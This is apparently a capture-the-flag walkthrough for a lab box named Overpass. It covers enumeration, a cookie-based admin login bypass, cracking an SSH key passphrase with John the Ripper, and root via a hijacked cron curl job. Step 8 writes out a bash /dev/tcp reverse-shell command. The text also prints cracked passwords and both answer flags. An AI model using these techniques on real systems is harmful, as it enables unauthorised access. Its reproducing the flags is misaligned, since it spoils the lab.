## IP=10.10.240.84


# Overpass #

### Approach:
	
1. Enumeration:
	* NMAP:
		* SSH (22) - OpenSSH 7.6p1
		* HTTP (80) - Golang
	* GoBuster:
		* /admin - Administrator login page.
		* /aboutus
			* Found some potential usernames:
				* Ninja 			(lead developer)
				* Pars				(shube enthusiast and emotional support animal manager)
				* Szymex			(head of security)
				* Bee				(chief drinking water coordinator)
				* MuirlandOracle	(cryptography consultant)

2. Navigated to the `/admin` page. Saw that the login functionality was client side JavaScript that I could view. Within the `login.js` file, you can see that when there is a successful login, the application knows by setting the cookie to SessionToken. If SessionToken == "Incorrect credentials", then the user cannot access the admin page. Now, if the SessionToken is anything but that, you get access to the admin page.
	* Found a RSA Private Key for the user `James`, which I saved locally as `rsa-private-key`.

3. We can use the RSA Private Key to attempt to login to the box via SSH.
	* Change the `rsa-private-key` file permissions to secure for SSH: `chmod 600 rsa-private-key`
	* Attempt to SSH using the private key: `ssh -i rsa-private-key james@$IP`
		* NO DICE. The RSA Private Key is password protected.
		* We can try to crack it using JohnTheRipper:
			1. Convert `rsa-private-key` to a format that JohnTheRipper can understand: `python /usr/share/john/ssh2john.py rsa-private-key > john-rsa-private-key.hash`.
			2. Use John and a wordlist to attept to crack the password: `john --wordlist=/usr/share/wordlists/rockyou.txt john-rsa-private-key.hash`
		* Password for `rsa-private-key`: `james13`

4. Answer to user flag is located at `/home/james/user.txt`.

5. Found the password for the user `james`.
	* Following along with the source code of the overpass application, you can see that all passwords are saved to the `~/.overpass` file. However, everything is encrypted using ROT47.
	* Navigating to james's .overpass file, I found this: `,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.`. Then using CyberChef I was able to decrypt it into this: `[{"name":"System","pass":"saydrawnlyingpicture"}]`.
	* Username: `james`
	* Password: `saydrawnlyingpicture`

6. Download and run linpeas.sh.
	* Not a lot of obvious stuff inside the output, but I did find out I could write to the `/etc/hosts` file.
	* Linpeas also picked up a root cron job that was runs a curl request that downloads and runs a bash script.
		* Cron Job; `/etc/crontab:16:* * * * * root curl overpass.thm/downloads/src/buildscript.sh`

7. Change the `/etc/hosts` to point to my machine rather than the machine's localhost.
	* Inside `/etc/hosts`, change this line, `127.0.0.1 overpass.thm`, to this line, `<MY IP> overpass.thm`.

8. On my local machine, I created the same folder/directory structure as in the URL for the curl request (`downloads/src/buildscript.sh`).
	* Inside my `buildscript.sh` was a bash script that would create a reverse shell using the command: `bash -c 'exec bash -i &>/dev/tcp/<MY IP>/5555 <&1'`
	* Then I started up a local server on port 80: `sudo python3 -m http.server 80`.
	* I also started up a netcat listener on port 5555: `nc -lnvp 5555`
	* Once everything is running, wait for a minute, then BOOM, you should have a reverse shell as root.

9. Answer to the root flag is located at `/root/root.txt`.


### Questions:

1. What is the user flag?

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

2. What is the root flag?

```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```